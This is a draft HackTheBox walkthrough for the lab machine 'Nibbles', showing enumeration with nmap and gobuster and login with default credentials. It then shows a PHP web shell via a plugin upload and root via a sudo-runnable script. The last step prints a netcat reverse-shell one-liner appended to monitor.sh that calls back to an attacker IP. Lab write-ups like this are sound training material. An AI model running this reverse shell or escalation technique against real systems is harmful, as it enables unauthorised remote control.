+++
tags = ["HackTheBox", "Linux", "Web Application", "RCE"]
title = "Nibbles - HTB"
weight = 10
draft = true
images = [ "/walkthroughs/Nibbles/logo.png" ]
description = "Nibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password does not take long for most."
+++

![Logo](logo.png)

Date written: April 2024     
Date published: 

## Enumeration

As always you will want to connect to your HTB VPN. 





![NMAP Scan](NMAP.png)

```bash
nc -nv  10.129.125.8 22
nc -nv  10.129.125.8 80
nmap -sV --script=http-enum 10.129.125.8
```

![NMAP HTTP enumeration and banner grabbing](NMAP2.png)

![Homepage source code](Nibbleblog.png)


```bash
gobuster dir -u http://10.129.125.8/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt
```
![Gobuster blog](gobuster.png)

```bash
curl http://10.129.125.8/nibbleblog/README
```
![Curl version](version.png)

![users directory location](<users file.png>)

![Users file contents](users.png)

username: admin
password: nibbles

![Log in](login.png)

![Plugin](<php shell2.png>)
![Shell file](<php shell.png>)

![Listener](listener.png)
![Shell directory](<php shell3.png>)

![Upgrade shell](<shell upgrade.png>)

Navigate to the ```/home/nibbler/user.txt``` file.

Unzip personal.zip cat monitor.sh

https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

![Python server](<python server.png>)

Nav to your IP not 0.0.0.0

chmod  +x LinEnum.sh
./LinEnum.sh

![LinEnum](LinEnum.png)

The user ```nibbler``` can run the file /home/nibbler/personal/stuff/monitor.sh with root privileges.
![sudo LinEnum](LinEnum2.png)

Write shell to monitor.sh file.

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.57 8443 >/tmp/f' | tee -a monitor.sh
```

![alt text](<Root listner.png>)

![alt text](<sudo privs.png>)

Nav to /root/root.txt